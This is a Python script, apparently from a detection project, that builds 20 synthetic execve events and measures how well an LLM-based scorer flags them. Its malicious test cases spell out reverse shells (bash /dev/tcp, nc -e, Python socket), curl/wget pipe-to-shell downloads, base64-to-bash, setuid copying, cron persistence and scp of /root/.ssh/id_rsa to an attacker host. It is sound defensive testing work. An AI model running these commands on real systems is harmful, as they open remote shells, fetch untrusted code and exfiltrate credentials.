#!/usr/bin/env python3
"""Generate a 20-command P1 corpus and evaluate the scorer against models.

Builds synthetic P1 execve events (benign + malicious Linux tradecraft) with a
ground-truth label, pipes them through ./scorer for each model, then prints a
per-command table and a confusion summary. HIGH band == "flagged malicious".
"""
import json, subprocess, sys, time

# (command_spec, truth)  truth: "mal" = should be flagged, "ben" = benign.
# executable + argv mirror what P1 would emit. Commands run via a shell are
# argv ["bash","-c", "<cmd>"]; direct execs name the binary.
def sh(cmd):   return ("/usr/bin/bash", ["bash", "-c", cmd], "bash", "sshd")
def exe(p, *a, parent="bash"):
    return (p, [p.split("/")[-1], *a], p.split("/")[-1], parent)

CASES = [
    # ---- benign (expect LOW) ----
    (exe("/usr/bin/ls", "-la", "/home"),                              "ben"),
    (exe("/usr/bin/apt-get", "update"),                              "ben"),
    (exe("/usr/bin/git", "pull", "origin", "main"),                  "ben"),
    (exe("/usr/bin/systemctl", "restart", "nginx"),                  "ben"),
    (exe("/usr/bin/cat", "/var/log/syslog"),                         "ben"),
    (exe("/usr/bin/python3", "manage.py", "migrate"),                "ben"),
    (exe("/usr/bin/docker", "ps", "-a"),                             "ben"),
    (exe("/usr/bin/tar", "-czf", "backup.tar.gz", "/var/www"),       "ben"),
    (exe("/usr/bin/npm", "install"),                                 "ben"),
    (exe("/usr/bin/ssh-keygen", "-t", "ed25519", "-f", "id_dev"),    "ben"),
    # ---- malicious (expect HIGH / at least GRAY) ----
    (sh("curl -fsSL http://185.220.101.5/x.sh | sh"),                "mal"),
    (sh("bash -i >& /dev/tcp/10.0.0.66/4444 0>&1"),                  "mal"),
    (exe("/usr/bin/nc", "-e", "/bin/sh", "10.0.0.66", "4444"),       "mal"),
    (exe("/tmp/.x/kworker"),                                         "mal"),
    (sh("echo ZWNobyBwd25k | base64 -d | bash"),                     "mal"),
    (sh("wget -qO- http://evil.host/cred.sh | sh"),                  "mal"),
    (sh("cp /bin/bash /tmp/.h/sh && chmod u+s /tmp/.h/sh"),          "mal"),
    (sh("(crontab -l; echo '* * * * * curl evil|sh') | crontab -"),  "mal"),
    (exe("/usr/bin/python3", "-c",
         "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.66',9001));"
         "os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])"),  "mal"),
    (exe("/usr/bin/scp", "/root/.ssh/id_rsa", "attacker@10.0.0.66:/tmp"), "mal"),
]

def build_corpus():
    lines, truth = [], {}
    for i, ((ex, argv, comm, parent), t) in enumerate(CASES):
        pid = 2001 + i
        truth[pid] = t
        lines.append(json.dumps({
            "schema_version": 1, "event_type": "execve",
            "timestamp": f"2026-06-22T11:00:{i:02d}.000000Z",
            "ktime_ns": 1_000_000 * (i + 1),
            "pid": pid, "tid": pid, "uid": 0, "gid": 0,
            "comm": comm, "cgroup_id": 42, "dropped_so_far": 0,
            "ppid": 1500, "parent_comm": parent,
            "executable": ex, "argv": argv, "is_execveat": False,
        }))
    return "\n".join(lines) + "\n", truth

def run(model, corpus):
    t0 = time.time()
    p = subprocess.run(["./scorer", "--model", model, "--workers", "4"],
                       input=corpus, capture_output=True, text=True, timeout=600)
    dt = time.time() - t0
    verds = {}
    for ln in p.stdout.splitlines():
        if ln.strip():
            v = json.loads(ln)
            verds[v["pid"]] = v
    return verds, dt, p.stderr.strip().splitlines()[-1]

def short(cmd, n=46):
    return cmd if len(cmd) <= n else cmd[:n-1] + "…"

def evaluate(model, corpus, truth):
    verds, dt, summary = run(model, corpus)
    print(f"\n{'='*100}\nMODEL: {model}    ({dt:.1f}s)    {summary}\n{'='*100}")
    print(f"{'pid':>4} {'truth':<5} {'band':<5} {'score':>5} {'verdict':<10} command")
    tp = fp = tn = fn = 0
    for pid in sorted(truth):
        v = verds.get(pid)
        if not v:
            print(f"{pid:>4} {truth[pid]:<5} {'MISS':<5}")
            continue
        flagged = v["band"] == "HIGH"            # HIGH == detection
        mal = truth[pid] == "mal"
        if mal and flagged: tp += 1
        elif mal and not flagged: fn += 1
        elif not mal and flagged: fp += 1
        else: tn += 1
        mark = "" if (mal == flagged) else "  <-- miss"
        print(f"{pid:>4} {truth[pid]:<5} {v['band']:<5} {v['risk_score']:>5.2f} "
              f"{v['verdict']:<10} {short(v['command'])}{mark}")
    prec = tp / (tp + fp) if tp + fp else 0.0
    rec  = tp / (tp + fn) if tp + fn else 0.0
    print(f"\n  HIGH-band detection:  TP={tp} FP={fp} TN={tn} FN={fn}  "
          f"precision={prec:.2f} recall={rec:.2f}")
    return model, prec, rec, dt

if __name__ == "__main__":
    models = sys.argv[1:] or ["phi3", "llama3.2:1b"]
    corpus, truth = build_corpus()
    with open("test-corpus.jsonl", "w") as f:
        f.write(corpus)
    print(f"wrote test-corpus.jsonl ({len(CASES)} commands: "
          f"{sum(t=='ben' for _,t in CASES)} benign / {sum(t=='mal' for _,t in CASES)} malicious)")
    rows = [evaluate(m, corpus, truth) for m in models]
    print(f"\n{'='*60}\nSUMMARY\n{'='*60}")
    print(f"{'model':<16} {'precision':>9} {'recall':>7} {'time':>7}")
    for m, p, r, dt in rows:
        print(f"{m:<16} {p:>9.2f} {r:>7.2f} {dt:>6.1f}s")
